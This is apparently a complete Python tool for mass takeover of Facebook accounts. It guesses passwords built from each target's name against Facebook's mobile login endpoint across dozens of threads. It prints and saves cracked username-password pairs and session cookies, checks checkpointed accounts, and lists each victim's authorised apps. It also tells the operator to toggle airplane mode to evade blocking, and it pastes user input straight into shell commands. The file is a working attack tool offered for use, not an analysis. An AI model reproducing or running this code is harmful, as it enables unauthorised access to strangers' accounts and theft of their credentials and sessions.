import os
try:
    import requests
except ImportError:
    print('\n [âœ“] installing requests !...\n')
    os.system('pip install requests')

try:
    import concurrent.futures
except ImportError:
    print('\n [âœ“] installing futures !...\n')
    os.system('pip install futures')

try:
    import bs4
except ImportError:
    print('\n [âœ“] installing bs4 !...\n')
    os.system('pip install bs4')

import requests, os, re, bs4,platform, sys, json, time, random, datetime, subprocess, threading, itertools,base64,uuid,zlib
from concurrent.futures import ThreadPoolExecutor as riazRIAZ
from datetime import datetime
from bs4 import BeautifulSoup


ct = datetime.now()
n = ct.month
bulan = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'Agustus', 'September', 'October', 'November', 'December']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
P = '\x1b[1;97m' # 
M = '\033[1;31m' # 
H = '\033[1;32m' # 
K = '\x1b[1;97m' # 
B = '\x1b[1;97m' # 
U = '\x1b[1;95m' # 
O = '\x1b[1;97m' # 
N = '\x1b[0m'    # 
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
data,data2={},{}
aman,cp,salah=0,0,0
ubahP,fuck,pwBaru=[],[],[]
Apk = []
ok = []
cp = []
id = []
user = []
loop = 0
url_lookup = "https://lookup-id.com/"
url_mb = "https://m.facebook.com"
url_ip = "https://www.httpbin.org/ip"
header_grup = {"user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/604.1 ;FBMD/iPhone;FBSN/iOS;FBSV/13.4.1;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5]"}
bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "Augustus", "09": "September", "10": "October", "11": "November", "12": "December"}
done = False
def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.01)
def loading():
    animation = ["[\x1b[1;91mâ– \x1b[0mâ–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡]","[\x1b[1;92mâ– â– \x1b[0mâ–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡]", "[\x1b[1;93mâ– â– â– \x1b[0mâ–¡â–¡â–¡â–¡â–¡â–¡â–¡]", "[\x1b[1;94mâ– â– â– â– \x1b[0mâ–¡â–¡â–¡â–¡â–¡â–¡]", "[\x1b[1;95mâ– â– â– â– â– \x1b[0mâ–¡â–¡â–¡â–¡â–¡]", "[\x1b[1;96mâ– â– â– â– â– â– \x1b[0mâ–¡â–¡â–¡â–¡]", "[\x1b[1;97mâ– â– â– â– â– â– â– \x1b[0mâ–¡â–¡â–¡]", "[\x1b[1;98mâ– â– â– â– â– â– â– â– \x1b[0mâ–¡â–¡]", "[\x1b[1;99mâ– â– â– â– â– â– â– â– â– \x1b[0mâ–¡]", "[\x1b[1;910mâ– â– â– â– â– â– â– â– â– â– \x1b[0m]"]
    for i in range(50):
        time.sleep(0.1)
        sys.stdout.write(f"\r {N}[{H}â€¢{N}] {H}Loading...{N} " + animation[i % len(animation)] +"\x1b[0m ")
        sys.stdout.flush()
   
logo ="""\033[1;97m
       \033[1;32m __    __   ______   __    __  ______ 
       \033[1;33m|  \  |  \ /      \ |  \  |  \|      \
       \033[1;34m      | $$  | $$|  $$$$$$\| $$\ | $$ \$$$$$$
       \033[1;35m| $$__| $$| $$__| $$| $$$\| $$  | $$  
       \033[1;36m| $$    $$| $$    $$| $$$$\ $$  | $$  
       \033[1;37m| $$$$$$$$| $$$$$$$$| $$\$$ $$  | $$  
       \033[1;33m| $$  | $$| $$  | $$| $$ \$$$$ _| $$ _ 
       \033[1;34m| $$  | $$| $$  | $$| $$  \$$$|   $$ \
       \033[1;35m       \$$   \$$ \$$   \$$ \$$   \$$ \$$$ $$$
\033[1;32m(√) =============================================
          ARWAZ_AARRU(🥀🥀)HANI_BABA_HERE                  
\033[1;32m(√)==============================================
\033[1;32m(√) \033[1;33mCREATED BY   :  \033[1;33mHANI-BABA(🥀🥀)
\033[1;32m(√) \033[1;34mON FACEBOK   :  \033[1;34m 🥀HANI🥀AARRU
\033[1;32m(√) \033[1;35mON GITHUB    :  \033[1;35mHANI-420(🥀🥀)
\033[1;32m(√) \033[1;36mTOOL STATUS  :  \033[1;36mTOOL IS FRE
\033[1;32m(√) \033[1;36mTOOL VIRSION :  \033[1;36m2.1.0
\033[1;32m(√)=============================================="""
def cek_apk(session,coki):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r %s[%s!%s] %sSorry there is no Active Apk%s  '%(N,M,N,M,N))
    else:
        print(f'\r ðŸŽ®  %sYour Active Application Details :'%(H))
        for i in range(len(game)):
            print(f"\r %s%s. %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
        #else:
            #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r %s[%s!%s] %sSorry no Expired Apk%s           \n'%(N,M,N,M,N))
    else:
        print(f'\r ðŸŽ®  %sYour Expired Application Details :'%(M))
        for i in range(len(game)):
            print(f"\r %s%s. %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
        else:
            print(f'\r')
            #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie\n'%(N,M,N))
def riaz():
    os.system('clear')
    print(logo)
    ipm = requests.get(url_ip).json()
    todz = ''
    IP = ipm['origin']
    print('[1]\033[1;32m File Cloning\033[1;37m [NEW UPDATE]')
    print('[2]\033[1;33m SEPRATE LINKS')
    print('[3]\033[1;34m REMOVE DOUBLE LINK')
    print('[4]\033[1;36m FILE MAKING')
    print('[5]\033[1;32m OLD RANDOM')
    print('[6]\033[1;34m UNLIMITED FILE MAKER')
    print('[N]\033[1;35m USE 100003 FILE FOR OK IDZ ')
    print('[N]\033[1;35m USE TOMATW VPN PROXY JAPAN')
    _riaz___ = input('       Choose option : ')
    if _riaz___ in ('1', '01'):     
        __AJAAA__().malikx(id)
    if _riaz___ in ('2', '02'):     
        sep()
    if _riaz___ in ('3', '03'):     
        dupcutter()
    if _riaz___ in ('4', '04'):     
        os.system("clear")
        os.system('python DUMP.py')
    if _riaz___ in ('5', '05'):
        self.old()
    if _riaz___ in ('6', '06'):
        os.system("clear")
        os.system('python u.py')
    if _riaz___ in ('E', 'ee'):
        pass



class __AJAAA__:
    def __init__(self):
        self.id = []
    def malikx(self,id):
        os.system("clear")
        print(logo)
        crot = input(f" {H}[{H}{H}] COOKIES TYPE Y WITHOUT COOKIES TYPE T [{H}y{H}/{H}t{H}]: ")
        os.system('clear')
        print (logo)
        if crot in[""]:
            print(f" {N}[{M}Ã—{N}] Don't be empty");__chigoue__().chi(id)
        elif crot in["Y","y"]:
            Apk.append("y")
        elif crot in["T","t"]:
            Apk.append("t")
        else:
            #jalan(f" {N}[{M}Ã—{N}] Sorry, wrong username");self.tampilkan_apk()
            print(f" {H}[{H}Ã—{H}] Select Between y/t");__chigoue__().chi(id)
        self.cnt = input('\033[1;92m Enter File Name :\033[1;92m ')
        self.id = open(self.cnt).read().splitlines()
        os.system('clear')
        print(logo)
        print("")
        ___worldwide___ = ('y')
        if ___worldwide___ in ('yes','Yes','Y', 'y'):
#            self.__ok__()
            self.__pler__()
        else:
            print(' [!] Choose Correct One');
            self.riazx(id)
    def __metode__(self, user, __chi__, cebok):
        global ok,cp,loop

        animasi = random.choice(["\x1b[1;92m[HANI]","\x1b[1;92m[HANI]","\x1b[1;92m[HANI]","\x1b[1;92m[HANI]","\x1b[1;92m[HANI]","\x1b[1;92m[HANI]","\x1b[1;92m[HANI]"])
        sys.stdout.write(f"\r {N}{animasi} {N}{loop}{N}/{M}{len(self.id)} {N}[{H}OK:{len(ok)}{N}][{B}CP:{len(cp)}{B}] [{H}{'{:.1%}'.format(loop/float(len(self.id)))}{N}]")
        sys.stdout.flush()
        try:
            for pw in __chi__:
                pw = pw.lower()
                session=requests.Session()
                header={
                    "Host":cebok,
                    "upgrade-insecure-requests":"1",
                    "user-agent":"Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/604.1 [FBAN/FBIOS;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/13.4.1;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5]",
                    "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                    "dnt":"1",
                    "x-requested-with":"mark.via.gp",
                    "sec-fetch-site":"same-origin",
                    "sec-fetch-mode":"cors",
                    "sec-fetch-user":"empty",
                    "sec-fetch-dest":"document",
                    "referer":"https://m.facebook.com/",
                    "accept-encoding":"gzip, deflate",
                    "accept-language":"en-US,en;q=0.9,q=0.8,q=0.7,q=0.6,q=0.5,q=0.4,q=0.3"
                 }                       
                r = session.get(f"https://{cebok}/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F", headers=header)
                das = {
                    "lsd":re.search('name="lsd" value="(.*?)"', str(r.text)).group(1),
                    "jazoest":re.search('name="jazoest" value="(.*?)"', str(r.text)).group(1),
                    "uid":user,
                    "flow":"login_no_pin",
                    "pass":pw,
                    "next":"https://developers.facebook.com/tools/debug/accesstoken/"
                }
                header1 = {
                    "Host":cebok,
                    "upgrade-insecure-requests":"1",
                    "user-agent":"Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/604.1",
                    "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                    "dnt":"1",
                    "x-requested-with":"mark.via.gp",
                    "sec-fetch-site":"same-origin",
                    "sec-fetch-mode":"cors",
                    "sec-fetch-user":"empty",
                    "sec-fetch-dest":"document",
                    "referer":"https://m.facebook.com/",
                    "accept-encoding":"gzip, deflate",
                    "accept-language":"en-US,en;q=0.9,q=0.8,q=0.7,q=0.6,q=0.5,q=0.4,q=0.3"
                }
                po = session.post(f"https://{cebok}/login/device-based/validate-password/?shbl=0", data = das, headers = header1, allow_redirects = False)
                if "c_user" in session.cookies.get_dict():
                    cooz = session.cookies.get_dict()
                    coki = 'datr=' + cooz['datr'] + ';' + ('c_user=' + cooz['c_user']) + ';' + ('fr=' + cooz['fr']) + ';' + ('xs=' + cooz['xs'])
                    if "t" in Apk:
                        print(f"\r {H} [OK-HANI]               \n USERNAME|| {user}     \n PASSWORD|| {pw}")
                    elif "y" in Apk:
                        print(f"\r {H} [OK-HANI]               \n USERNAME|| {user}     \n PASSWORD||  {pw}")
                        print('--------------------------------------------------')
                        print(f'\r {H}Cookie   : {coki}')
                        print('--------------------------------------------------')
                    wrt = '%s|%s' % (user,pw)
                    ok.append(wrt)
                    cek_apk(session,coki)
                    open('HANI_OK.txt' , 'a').write('%s\n' % wrt)
                    break
                elif 'checkpoint' in session.cookies.get_dict():
                    try:
                        tokenz = open('.token.txt').read()
                        cp_ttl = session.get(f'https://graph.facebook.com/{user}?fields=birthday&access_token={tokenz}').json()['birthday']
                        month, day, year = cp_ttl.split('/')
                        month = bulan_ttl[month]
                        print(f"\r {P} [CP-HANI]               \n \033[1;32mUSERNAME||  {user}     \n PASSWORD|| {pw}")
                        wrt = '%s|%s' % (user,pw)
                        cp.append(wrt)
                        open('HANI_CP.txt' , 'a').write('%s\n' % wrt)
                        break
                    except (KeyError, IOError):
                        month = ''
                        day   = ''
                        year  = ''
                    except:pass
                    print(f"\r {P} [CP-HANI]               \n \033[1;32mUSERNAME|| {user}     \n PASSWORD|| {pw}")
                    wrt = '%s|%s' % (user,pw)
                    cp.append(wrt)
                    open('HANI_CP.txt' , 'a').write('%s\n' % wrt)
                    break
                else:
                    continue
            loop+=1
        except:
            self.__metode__(user, pw, cebok)
    def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://mbasic.facebook.com/profile.php?id=100081530106222', cookies={'cookie': coki}).text, 'html.parser')
        get = r.find('a', string='Ikuti').get('href')
        session.get(('https://m.facebook.com' + str(get)), cookies={'cookie': coki}).text

    def __pler__(self):
        print('1.METHOD 1(VIP)')
        print('2.METHOD 2')
        chi = input('\n        Choose: ')
        if chi == '':
            print('\nSelect Correct One')
            self.__pler__()
        elif chi in ('1', '01'):
            os.system("clear")
            print(logo)
            print("\033[1;97m\rUse flight (airplane) mode before use\033[1;97m")
            print(47*"-")
            print('\033[1;97m Total IDs : %s ' % len(self.id))
            print(47*"-")
            with riazRIAZ(max_workers=60) as RIAZworld:
                for AJA in self.id: 
                    try:
                        uid, name = AJA.split('|')
                        xz = name.split(' ')
                        first, last = name.split(' ')
                        firstl = first.lower()
                        lastl = last.lower()
                        firsts = first.capitalize()
                        lasts = last.capitalize()
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [firstl+' '+lastl]
                        else:
                            pwx = [firstl+' '+lastl]
                            pwx = [firstl+' '+lastl]
                        RIAZworld.submit(self.__metode__, uid, pwx, "m.facebook.com")
                    except:
                        pass
            hasil(ok,cp)
        elif chi in ('2', '02'):
            os.system("clear")
            print(logo)
            print("\033[1;97m\rUse flight (airplane) mode before use\033[1;97m")
            print(47*"-")
            print('\033[1;97m Total IDs : %s ' % len(self.id))
            print(47*"-")
            with riazRIAZ(max_workers=60) as RIAZworld:
                for AJA in self.id: 
                    try:
                        uid, name = AJA.split('|')
                        xz = name.split(' ')
                        first = xz[0].lower()
                        First = xz[0]
                        last = xz[1].lower()
                        Last = xz[1]                      
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [name, first+' '+last, First+' '+Last]
                            pwx = [name, first+' '+last, First+' '+Last]
                        else:
                            pwx = [name, first+' '+last, First+' '+Last]
                        RIAZworld.submit(self.__metode__, uid, pwx, "m.facebook.com")
                    except:
                        pass
            hasil(ok,cp)
def sep():
    os.system('clear');print(logo)
    try:
        limit = int(input(' How many links do you want to separate? '))
    except:
        limit = 1
    print ('\033[1;32m Example /sdcard/xxx.txt')
    file_name = input('\033[1;33m Input file name: ')
    print ('\033[1;32m Example /sdcard/xnew.txt')
    new_save = input('\033[1;33m Save new file as: ')
    y = 0
    for k in range(limit):
        y+=1
        print ('\033[1;32m EXAMPLE [100083],[100084] etc\033[0m')
        links = input(' \033[1;33mPut links %s:\033[1;32m '%(y))
        os.system('cat '+file_name+' | grep "'+links+'" >> '+new_save)
    print(54*"\033[1;33m_")
    print("")
    print('\033[1;33m Links grabbed successfully')
    print(' Total grabbed links:\033[1;32m   '+str(len(open(new_save).read().splitlines())))
    print('\033[1;33m New file saved as: \033[1;32m  '+new_save)
    print(54*"\033[1;33m_")
    print("")
    input('\033[1;32m Press enter to back ')
    riaz()

def dupcutter():
	os.system('clear');print(logo)
	print("[+] Example : /sdcard/your_file_name.txt  \n\n")
	Mahar = input('[+] File Path   : ')
	Armsty = input('[+] New File Save As : ')
	os.system('touch ' +Armsty)
	os.system('sort -r '+Mahar+' | uniq > '+Armsty)
	print("")
	print("")
	print(54*"\033[1;33m_")
	print("")
	print("[+] Removing Successful  From File " + Mahar )
	print("[+] New File Save " + Armsty )
	print("")
	print(54*"\033[1;33m_")
	time.sleep(2)
	riaz()
os.system("git pull")
riaz()